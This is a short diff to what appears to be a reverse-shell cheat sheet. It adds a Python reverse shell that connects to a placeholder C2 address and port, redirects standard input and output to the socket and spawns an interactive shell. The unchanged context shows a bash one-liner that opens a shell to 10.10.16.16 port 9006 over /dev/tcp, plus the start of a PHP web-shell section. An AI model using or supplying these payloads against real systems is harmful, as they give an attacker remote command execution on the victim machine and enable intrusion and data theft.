@@ -13,6 +13,22 @@ Bash
 /bin/bash -c 'bash+-i >& /dev/tcp/10.10.16.16/9006 0>&1'
 ```
 
+Python But Bash
+```sh
+#!/usr/bin/python3
+import socket
+import subprocess
+import os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("<c2-ipv4>",<c2-port>))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+import pty
+pty.spawn("sh")
+```
+
+
 Web Shell
 ```php
 <html>
